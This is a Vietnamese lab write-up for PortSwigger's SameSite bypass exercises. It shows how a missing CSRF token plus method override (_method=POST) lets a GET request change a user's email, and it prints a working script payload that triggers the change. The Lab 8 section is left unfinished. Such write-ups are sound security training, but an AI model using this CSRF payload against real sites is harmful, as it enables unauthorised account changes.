
# [Lab 7: SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

![Yêu cầu lab 7](image.png)

```
- Mô tả lab:

- Mục tiêu: 
```

main web

![Alt text](../image/lab7/01.png)

login `wiener:peter`, `Update email`

![Alt text](../image/lab7/02.png)

không hề có CSRF token bảo vệ

![Alt text](../image/lab7/03.png)

SameSite cũng không chặn gì

![Alt text](../image/lab7/04.png)

đổi method POST sang GET (Right-click → Change request method)

![Alt text](../image/lab7/05.png)

method không được phép

![Alt text](../image/lab7/06.png)

thêm key `_method=POST` thì lại change được bình thường

![Alt text](../image/lab7/07.png)

![Alt text](../image/lab7/08.png)

→ Tấn công CSRF

```
<script>
    document.location = "https://0a7b009e0489153780b626ba00ba0007.web-security-academy.net/my-account/change-email?email=solveb%40Test&_method=POST"
</script>
```

![Alt text](../image/lab7/09.png)

View exploit để test xem có thành công không và deliver to victim and solve lab

![Alt text](../image/lab7/10.png)

# [Lab 8: SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

![Yêu cầu lab 8](image.png)

main web

![Alt text](image-1.png)

# []()

# []()

